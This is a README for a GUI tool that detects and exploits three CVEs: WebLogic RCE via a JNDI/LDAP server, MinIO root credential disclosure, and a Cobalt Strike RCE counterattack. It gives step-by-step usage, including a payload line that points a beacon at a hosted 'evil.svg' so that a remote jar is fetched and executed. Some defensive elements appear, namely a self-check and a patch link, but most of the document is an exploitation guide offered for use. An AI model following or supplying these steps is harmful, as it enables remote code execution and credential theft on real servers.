# Gui-poc-test
A testing tool for CobaltStrike-RCE:CVE-2022-39197; Weblogic-RCE:CVE-2023-21839; MinIO:CVE-2023-28432

对这三种漏洞的图形化漏洞检测和利用工具

## 注意事项
1.运行jar需java8

2.针对单目标，不适用多ip漏扫

3.打包时weblogic漏洞利用需引用wlfullclient.jar，需自行添加

## Usage
```java -jar Gui-poc-test.jar```

使用方法：有检测和利用两个按钮，漏洞不同的使用方法工具界面有提示

### MinIO 信息泄露：
输入目标，无需输入端口，默认9000，可更改，见源码GuiDemo.java:line144

回显MINIO_ROOT_USER和MINIO_ROOT_PASSWORD等

<img width="227" alt="image" src="https://github.com/Romanc9/Gui-poc-test/assets/55196564/42161c10-1acf-4866-92ae-19be85be5f14">

### Weblogic RCE
输入目标ip、端口、LDAP服务器地址

检测：

<img width="969" alt="image" src="https://github.com/Romanc9/Gui-poc-test/assets/55196564/3a71f2d1-84c0-475b-b0c5-d962f567dbf9">

注意：漏洞利用需自行搭建ldap服务器(公网)
- jndi server利用工具：使用JNDIExploit.jar工具开启LDAP和WEB服务，参考https://github.com/WhiteHSBG/JNDIExploit

<img width="968" alt="image" src="https://github.com/Romanc9/Gui-poc-test/assets/55196564/a7465773-f8df-4110-9f96-4d0a73b14bf0">

### CobaltStrike RCE
1. 选择漏洞后默认显示自查漏洞的方法，在cs监听器输入检测代码可自测漏洞是否存在
2. 漏洞利用前提：本地已获取到对方木马（exe）
3. 运行环境要求：win,python3,pip3安装frida-tools
4. python已加入环境变量
5. 自行搭建服务器放置svg文件,jar包,对方能访问
6. 输入exe绝对路径和svg地址,空格隔开,点击执行实现反制
7. jar包内容自行设置，演示内容为弹出计算器
8. 默认木马名为beacon,可修改，见源码cve_2022_39197.py:line28

payload示例:
```beacon.exe http://127.0.0.1:4444/evil.svg```

实现结果：win运行马，mac上的cs客户端上线

同时cs端执行jar包内容，弹出计算器

<img width="657" alt="image" src="https://github.com/Romanc9/Gui-poc-test/assets/55196564/30a827a6-a6e4-475e-8eba-54b208d67641">

win记录到cs访问地址

<img width="963" alt="image" src="https://github.com/Romanc9/Gui-poc-test/assets/55196564/a96832d6-eb2a-4d77-b652-8078fa685411">

## Reference
原理：https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_zh_CN.md

https://github.com/4ra1n/CVE-2023-21839

https://github.com/DXask88MA/Weblogic-CVE-2023-21839

https://github.com/its-arun/CVE-2022-39197

cs补丁:https://github.com/burpheart/CVE-2022-39197-patch





